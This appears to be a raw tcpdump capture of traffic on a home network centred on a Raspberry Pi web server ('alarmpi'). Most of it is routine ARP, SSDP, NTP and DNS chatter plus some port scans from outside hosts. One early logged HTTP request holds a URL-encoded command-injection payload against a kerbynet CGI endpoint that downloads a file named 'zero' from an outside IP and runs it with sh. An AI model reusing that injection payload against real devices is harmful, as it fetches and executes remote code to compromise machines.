+16:44:05.954061 IP alarmpi.http > nz104l173.bb60246.ctm.net.51444: Flags [S.], seq 517525304, ack 2020103610, win 65160, options [mss 1460,sackOK,TS val 4042815976 ecr 44491820,nop,wscale 7], length 0
+16:44:06.158198 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [.], ack 1, win 1369, options [nop,nop,TS val 44491840 ecr 4042815976], length 0
+16:44:06.705173 IP pc3.53139 > 239.255.255.250.ssdp: UDP, length 166
+16:44:06.746964 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [P.], seq 1:151, ack 1, win 1369, options [nop,nop,TS val 44491899 ecr 4042815976], length 150: HTTP: GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0
+16:44:06.747111 IP alarmpi.http > nz104l173.bb60246.ctm.net.51444: Flags [.], ack 151, win 508, options [nop,nop,TS val 4042816769 ecr 44491899], length 0
+16:44:06.747595 IP alarmpi.http > nz104l173.bb60246.ctm.net.51444: Flags [P.], seq 1:304, ack 151, win 508, options [nop,nop,TS val 4042816769 ecr 44491899], length 303: HTTP: HTTP/1.1 404 Not Found
+16:44:06.748028 IP alarmpi.http > nz104l173.bb60246.ctm.net.51444: Flags [F.], seq 304, ack 151, win 508, options [nop,nop,TS val 4042816770 ecr 44491899], length 0
+16:44:06.952810 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [.], ack 304, win 1369, options [nop,nop,TS val 44491920 ecr 4042816769], length 0
+16:44:06.991675 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [.], ack 305, win 1369, options [nop,nop,TS val 44491924 ecr 4042816770], length 0
+16:44:10.961854 ARP, Request who-has alarmpi tell _gateway, length 46
+16:44:10.961945 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:44:32.314073 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [R.], seq 151, ack 305, win 1369, options [nop,nop,TS val 44494456 ecr 4042816770], length 0
+16:45:27.035512 IP edge-mqtt-mini-shv-01-any2.facebook.com.https > RedmiNote8T-Redmi.38656: Flags [P.], seq 485325863:485325894, ack 1635338161, win 251, options [nop,nop,TS val 1246038058 ecr 3474072518], length 31
+16:45:27.036997 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:27.359036 IP alarmpi.41260 > _gateway.domain: 16680+ [1au] PTR? 34.250.171.69.in-addr.arpa. (55)
+16:45:27.371746 ARP, Request who-has alarmpi tell _gateway, length 46
+16:45:27.371821 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:45:27.372002 IP _gateway.domain > alarmpi.41260: 16680 1/0/1 PTR edge-mqtt-mini-shv-01-any2.facebook.com. (108)
+16:45:28.033174 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:29.033170 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:30.046228 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:31.043220 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:32.043229 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:32.389701 ARP, Request who-has _gateway tell alarmpi, length 28
+16:45:32.389902 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:45:33.052241 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:34.043264 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:35.043285 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:36.052129 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:37.043311 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:38.043319 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:39.052259 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:40.043373 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:41.043372 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:42.052269 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:43.043399 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:44.043422 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:45.052297 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:46.043452 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:47.043472 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:48.052280 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:49.043501 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:50.043516 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:51.052276 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:52.043558 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:53.043576 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:54.052308 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:55.043602 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:56.043623 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:57.054291 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:58.053665 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:45:59.053689 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:00.064251 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:01.063707 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:02.063702 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:03.074332 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:03.708153 IP pc3.36078 > 239.255.255.250.ssdp: UDP, length 166
+16:46:04.073739 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:04.709615 IP pc3.36078 > 239.255.255.250.ssdp: UDP, length 166
+16:46:05.073754 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:05.710554 IP pc3.36078 > 239.255.255.250.ssdp: UDP, length 166
+16:46:06.084700 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:06.711345 IP pc3.36078 > 239.255.255.250.ssdp: UDP, length 166
+16:46:07.083816 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:08.083821 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:09.094317 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:10.093851 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:11.093877 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:12.254683 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:13.253896 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:14.253910 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:15.264198 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:16.263951 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:17.263981 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:18.274183 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:19.274033 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:20.274022 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:21.284356 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:22.284054 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:23.284072 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:24.294400 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:25.294136 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:26.294105 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:27.304311 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:28.304160 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:29.304185 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:30.314315 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:31.314192 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:32.314206 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:33.324401 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:34.324241 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:35.324266 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:36.334703 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:37.334310 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:38.334309 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:39.344577 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:40.344350 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:41.344390 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:42.356505 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:43.354390 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:44.354412 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:47.006790 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:48.004475 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:49.004481 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:51.231800 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:52.224616 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:53.224553 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:55.454658 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:56.454610 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:57.454625 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:46:59.678763 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:00.674712 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:01.674717 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:03.902685 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:04.894757 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:05.894765 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:08.126663 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:09.124826 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:47:10.124829 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:48:03.714689 IP pc3.51859 > 239.255.255.250.ssdp: UDP, length 166
+16:48:04.715600 IP pc3.51859 > 239.255.255.250.ssdp: UDP, length 166
+16:48:05.716962 IP pc3.51859 > 239.255.255.250.ssdp: UDP, length 166
+16:48:06.717529 IP pc3.51859 > 239.255.255.250.ssdp: UDP, length 166
+16:49:08.577983 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:09.574493 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:10.573037 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:11.574312 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:12.574887 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:13.586582 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:21.579373 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:22.590403 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:23.577312 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:24.578603 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:25.578067 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:26.578308 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:34.580953 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:35.591762 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:36.582967 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:37.578693 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:38.578055 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:39.577027 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:47.580616 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:48.578426 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:49.578052 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:50.579532 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:51.577302 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:49:52.577016 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:00.601971 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:01.577118 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:02.577084 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:03.577195 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:03.720396 IP pc3.51441 > 239.255.255.250.ssdp: UDP, length 166
+16:50:04.576987 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:04.721944 IP pc3.51441 > 239.255.255.250.ssdp: UDP, length 166
+16:50:05.578514 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:50:05.723053 IP pc3.51441 > 239.255.255.250.ssdp: UDP, length 166
+16:50:06.723517 IP pc3.51441 > 239.255.255.250.ssdp: UDP, length 166
+16:52:03.727085 IP pc3.53293 > 239.255.255.250.ssdp: UDP, length 166
+16:52:04.728505 IP pc3.53293 > 239.255.255.250.ssdp: UDP, length 166
+16:52:05.729681 IP pc3.53293 > 239.255.255.250.ssdp: UDP, length 166
+16:52:06.730654 IP pc3.53293 > 239.255.255.250.ssdp: UDP, length 166
+16:54:03.732541 IP pc3.41934 > 239.255.255.250.ssdp: UDP, length 166
+16:54:04.734158 IP pc3.41934 > 239.255.255.250.ssdp: UDP, length 166
+16:54:05.734907 IP pc3.41934 > 239.255.255.250.ssdp: UDP, length 166
+16:54:06.735933 IP pc3.41934 > 239.255.255.250.ssdp: UDP, length 166
+16:56:03.739430 IP pc3.45868 > 239.255.255.250.ssdp: UDP, length 166
+16:56:04.741348 IP pc3.45868 > 239.255.255.250.ssdp: UDP, length 166
+16:56:05.741806 IP pc3.45868 > 239.255.255.250.ssdp: UDP, length 166
+16:56:06.743194 IP pc3.45868 > 239.255.255.250.ssdp: UDP, length 166
+16:58:01.025396 IP alarmpi.33009 > time.cloudflare.com.ntp: NTPv4, Client, length 48
+16:58:01.035781 ARP, Request who-has alarmpi tell _gateway, length 46
+16:58:01.035850 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:58:01.035999 IP time.cloudflare.com.ntp > alarmpi.33009: NTPv4, Server, length 48
+16:58:03.745919 IP pc3.36153 > 239.255.255.250.ssdp: UDP, length 166
+16:58:04.747362 IP pc3.36153 > 239.255.255.250.ssdp: UDP, length 166
+16:58:05.748453 IP pc3.36153 > 239.255.255.250.ssdp: UDP, length 166
+16:58:06.069741 ARP, Request who-has _gateway tell alarmpi, length 28
+16:58:06.069934 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:58:06.750471 IP pc3.36153 > 239.255.255.250.ssdp: UDP, length 166
+17:00:03.749283 IP pc3.38721 > 239.255.255.250.ssdp: UDP, length 166
+17:00:04.750047 IP pc3.38721 > 239.255.255.250.ssdp: UDP, length 166
+17:00:05.750703 IP pc3.38721 > 239.255.255.250.ssdp: UDP, length 166
+17:00:06.751962 IP pc3.38721 > 239.255.255.250.ssdp: UDP, length 166
+17:02:03.758399 IP pc3.51011 > 239.255.255.250.ssdp: UDP, length 166
+17:02:04.760527 IP pc3.51011 > 239.255.255.250.ssdp: UDP, length 166
+17:02:05.761329 IP pc3.51011 > 239.255.255.250.ssdp: UDP, length 166
+17:02:06.761745 IP pc3.51011 > 239.255.255.250.ssdp: UDP, length 166
+17:04:03.764303 IP pc3.35198 > 239.255.255.250.ssdp: UDP, length 166
+17:04:04.765623 IP pc3.35198 > 239.255.255.250.ssdp: UDP, length 166
+17:04:05.766652 IP pc3.35198 > 239.255.255.250.ssdp: UDP, length 166
+17:04:06.767785 IP pc3.35198 > 239.255.255.250.ssdp: UDP, length 166
+17:06:03.770648 IP pc3.60223 > 239.255.255.250.ssdp: UDP, length 166
+17:06:04.772096 IP pc3.60223 > 239.255.255.250.ssdp: UDP, length 166
+17:06:05.773438 IP pc3.60223 > 239.255.255.250.ssdp: UDP, length 166
+17:06:06.774241 IP pc3.60223 > 239.255.255.250.ssdp: UDP, length 166
+17:06:19.002075 ARP, Request who-has alarmpi tell _gateway, length 46
+17:06:19.002183 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:06:19.002361 IP 195.54.160.21.49002 > alarmpi.http: Flags [S], seq 542522371, win 1024, options [mss 536], length 0
+17:06:19.002587 IP alarmpi.http > 195.54.160.21.49002: Flags [S.], seq 2522900059, ack 542522372, win 64240, options [mss 1460], length 0
+17:06:19.070650 IP 195.54.160.21.49002 > alarmpi.http: Flags [R], seq 542522372, win 0, length 0
+17:06:19.077503 IP 195.54.160.21.49002 > alarmpi.http: Flags [R], seq 542522372, win 1200, length 0
+17:06:19.519572 IP alarmpi.57042 > _gateway.domain: 35381+ [1au] PTR? 21.160.54.195.in-addr.arpa. (55)
+17:06:19.532253 IP _gateway.domain > alarmpi.57042: 35381 NXDomain 0/1/1 (115)
+17:06:19.710374 IP alarmpi.37292 > 195.54.160.21.llmnr: Flags [S], seq 2165580510, win 64240, options [mss 1460,sackOK,TS val 2792078199 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:06:19.710742 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+17:06:24.069701 ARP, Request who-has _gateway tell alarmpi, length 28
+17:06:24.069958 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:07:35.612782 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:36.609797 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:37.610314 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:38.611233 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:39.620542 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:40.608911 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:48.616732 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:49.613009 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:50.628136 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:51.624971 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:52.612857 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:07:53.613945 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:01.617220 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:02.624537 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:03.615662 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:03.776892 IP pc3.35015 > 239.255.255.250.ssdp: UDP, length 166
+17:08:04.614241 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:04.778983 IP pc3.35015 > 239.255.255.250.ssdp: UDP, length 166
+17:08:05.614209 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:05.780643 IP pc3.35015 > 239.255.255.250.ssdp: UDP, length 166
+17:08:06.614437 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:06.781381 IP pc3.35015 > 239.255.255.250.ssdp: UDP, length 166
+17:08:14.616850 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:15.613900 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:16.612847 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:17.614951 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:18.612833 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:19.614305 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:27.616979 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:28.612947 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:29.612903 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:30.615372 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:31.613344 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:32.614140 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:08:38.902646 ARP, Request who-has alarmpi tell _gateway, length 46
+17:08:38.902741 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:08:38.902912 IP localhost.48013 > alarmpi.http: Flags [S], seq 1332508915, win 36285, options [mss 1452], length 0
+17:08:38.903152 IP alarmpi.http > localhost.48013: Flags [S.], seq 1156074126, ack 1332508916, win 64240, options [mss 1460], length 0
+17:08:39.113564 IP localhost.48013 > alarmpi.http: Flags [R], seq 1332508916, win 0, length 0
+17:08:39.919115 IP alarmpi.33956 > _gateway.domain: 39726+ [1au] PTR? 167.75.75.27.in-addr.arpa. (54)
+17:08:40.025903 IP alarmpi.43790 > localhost.llmnr: Flags [S], seq 3760826225, win 64240, options [mss 1460,sackOK,TS val 2207562677 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:08:40.026264 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+17:08:40.141180 IP _gateway.domain > alarmpi.33956: 39726 1/0/1 PTR localhost. (77)
+17:08:43.909703 ARP, Request who-has _gateway tell alarmpi, length 28
+17:08:43.909933 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:10:03.784152 IP pc3.52929 > 239.255.255.250.ssdp: UDP, length 166
+17:10:04.785381 IP pc3.52929 > 239.255.255.250.ssdp: UDP, length 166
+17:10:05.786257 IP pc3.52929 > 239.255.255.250.ssdp: UDP, length 166
+17:10:06.787850 IP pc3.52929 > 239.255.255.250.ssdp: UDP, length 166
+17:12:03.790374 IP pc3.54605 > 239.255.255.250.ssdp: UDP, length 166
+17:12:04.791866 IP pc3.54605 > 239.255.255.250.ssdp: UDP, length 166
+17:12:05.793234 IP pc3.54605 > 239.255.255.250.ssdp: UDP, length 166
+17:12:06.794347 IP pc3.54605 > 239.255.255.250.ssdp: UDP, length 166
+17:13:58.634188 ARP, Request who-has alarmpi tell _gateway, length 46
+17:13:58.634291 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:13:58.634472 IP 180-176-213-14.dynamic.kbronet.com.tw.1024 > alarmpi.http: Flags [S], seq 1332508915, win 46286, options [mss 536], length 0
+17:13:58.634706 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.1024: Flags [S.], seq 149575887, ack 1332508916, win 64240, options [mss 1460], length 0
+17:13:59.199148 IP alarmpi.36157 > _gateway.domain: 16720+ [1au] PTR? 14.213.176.180.in-addr.arpa. (56)
+17:13:59.387407 IP alarmpi.51902 > 180-176-213-14.dynamic.kbronet.com.tw.llmnr: Flags [S], seq 1599024060, win 64240, options [mss 1460,sackOK,TS val 3862224621 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:13:59.387795 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+17:13:59.655220 IP _gateway.domain > alarmpi.36157: 16720 1/0/1 PTR 180-176-213-14.dynamic.kbronet.com.tw. (107)
+17:13:59.669777 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.1024: Flags [S.], seq 149575887, ack 1332508916, win 64240, options [mss 1460], length 0
+17:14:00.828186 IP 180-176-213-14.dynamic.kbronet.com.tw.49235 > alarmpi.http: Flags [S], seq 2477318022, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 1], length 0
+17:14:00.828427 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [S.], seq 580750426, ack 2477318023, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:01.749722 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.1024: Flags [S.], seq 149575887, ack 1332508916, win 64240, options [mss 1460], length 0
+17:14:01.829699 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [S.], seq 580750426, ack 2477318023, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:03.669691 ARP, Request who-has _gateway tell alarmpi, length 28
+17:14:03.669944 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:14:03.796300 IP pc3.54708 > 239.255.255.250.ssdp: UDP, length 166
+17:14:03.909747 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [S.], seq 580750426, ack 2477318023, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:04.565466 IP 180-176-213-14.dynamic.kbronet.com.tw.49235 > alarmpi.http: Flags [.], ack 1, win 7300, options [nop,nop,sack 1 {0:1}], length 0
+17:14:04.798027 IP pc3.54708 > 239.255.255.250.ssdp: UDP, length 166
+17:14:05.798420 IP pc3.54708 > 239.255.255.250.ssdp: UDP, length 166
+17:14:05.829753 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.1024: Flags [S.], seq 149575887, ack 1332508916, win 64240, options [mss 1460], length 0
+17:14:06.256085 IP 180-176-213-14.dynamic.kbronet.com.tw.49280 > alarmpi.http: Flags [S], seq 3598827633, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 1], length 0
+17:14:06.256261 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [S.], seq 1660186485, ack 3598827634, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:06.261440 IP 180-176-213-14.dynamic.kbronet.com.tw.1024 > alarmpi.http: Flags [R], seq 1332508916, win 0, length 0
+17:14:06.288141 IP 180-176-213-14.dynamic.kbronet.com.tw.49318 > alarmpi.http: Flags [S], seq 3823686293, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 1], length 0
+17:14:06.288256 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [S.], seq 3485514399, ack 3823686294, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:06.800125 IP pc3.54708 > 239.255.255.250.ssdp: UDP, length 166
+17:14:07.269722 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [S.], seq 1660186485, ack 3598827634, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:07.349713 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [S.], seq 3485514399, ack 3823686294, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+17:14:08.130282 IP 180-176-213-14.dynamic.kbronet.com.tw.49280 > alarmpi.http: Flags [.], ack 1, win 7300, options [nop,nop,sack 1 {0:1}], length 0
+17:14:08.135560 IP 180-176-213-14.dynamic.kbronet.com.tw.49318 > alarmpi.http: Flags [.], ack 1, win 7300, options [nop,nop,sack 1 {0:1}], length 0
+17:14:10.958134 IP 180-176-213-14.dynamic.kbronet.com.tw.49318 > alarmpi.http: Flags [P.], seq 1:15, ack 1, win 7300, length 14: HTTP: GET / HTTP/1.1[!http]
+17:14:10.958329 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [.], ack 15, win 502, length 0
+17:14:13.605386 IP 180-176-213-14.dynamic.kbronet.com.tw.49280 > alarmpi.http: Flags [P.], seq 1:15, ack 1, win 7300, length 14: HTTP: GET / HTTP/1.1[!http]
